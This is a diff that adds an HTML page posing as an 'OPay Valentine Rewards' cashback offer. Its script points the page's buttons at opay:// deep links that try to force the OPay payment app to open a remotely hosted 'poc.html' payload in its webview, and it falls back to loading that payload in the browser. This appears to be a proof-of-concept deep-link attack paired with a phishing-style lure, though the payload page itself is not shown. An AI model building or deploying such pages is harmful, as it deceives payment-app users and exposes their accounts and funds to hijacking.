@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OPay Rewards</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', sans-serif;
+            background: linear-gradient(135deg, #00c853 0%, #009624 100%);
+            color: #fff;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .card {
+            background: white;
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 360px;
+            width: 100%;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .logo {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+
+        h1 {
+            color: #333;
+            font-size: 22px;
+            margin-bottom: 8px;
+        }
+
+        .sub {
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+
+        .btn {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            margin: 8px 0;
+            background: #00c853;
+            color: white;
+            text-decoration: none;
+            border-radius: 10px;
+            font-weight: bold;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        .btn:active {
+            transform: scale(0.97);
+            background: #00a844;
+        }
+
+        .btn.alt {
+            background: #1a73e8;
+        }
+
+        .btn.alt:active {
+            background: #1557b0;
+        }
+
+        .small {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 20px;
+        }
+
+        .status {
+            font-size: 12px;
+            color: #999;
+            margin-top: 10px;
+            min-height: 16px;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="card">
+        <div class="logo">🎁</div>
+        <h1>OPay Valentine Rewards</h1>
+        <div class="sub">Tap below to claim your cashback reward in OPay!</div>
+
+        <a id="btnA" class="btn" href="#">🎉 Claim Reward Now</a>
+        <a id="btnB" class="btn alt" href="#">💰 Open in OPay</a>
+
+        <div class="status" id="status"></div>
+
+        <div class="small">Powered by OPay • Offer expires soon</div>
+    </div>
+
+    <script>
+        var PAYLOAD_BASE = "https://zugonwobi.github.io/opay-rewards/";
+        var CB = "?v=" + new Date().getTime();
+
+        // iOS: OPay uses custom URL schemes
+        // Try multiple scheme patterns that OPay iOS may register
+        var payloadUrl = encodeURIComponent(PAYLOAD_BASE + "poc.html" + CB);
+        var payloadV2 = encodeURIComponent(PAYLOAD_BASE + "v2/poc.html" + CB);
+
+        // Method A: opay:// scheme (if registered by OPay iOS app)
+        var A = "opay://webview?url=" + payloadUrl;
+
+        // Method B: Universal Link fallback - direct to poc in browser
+        // If OPay has claimed universal links, this may open in-app
+        var B = "opay://applink?url=" + payloadV2;
+
+        document.getElementById("btnA").href = A;
+        document.getElementById("btnB").href = B;
+
+        document.getElementById("btnA").addEventListener("click", function () {
+            document.getElementById("status").innerText = "Opening OPay...";
+            // Fallback: if opay:// doesn't work, try loading directly in 3s
+            setTimeout(function () {
+                document.getElementById("status").innerText = "Trying direct load...";
+                window.location.href = PAYLOAD_BASE + "poc.html" + CB;
+            }, 3000);
+        });
+
+        document.getElementById("btnB").addEventListener("click", function () {
+            document.getElementById("status").innerText = "Launching OPay App...";
+            setTimeout(function () {
+                document.getElementById("status").innerText = "Trying alternate...";
+                window.location.href = PAYLOAD_BASE + "v2/poc.html" + CB;
+            }, 3000);
+        });
+    </script>
+</body>
+
+</html>
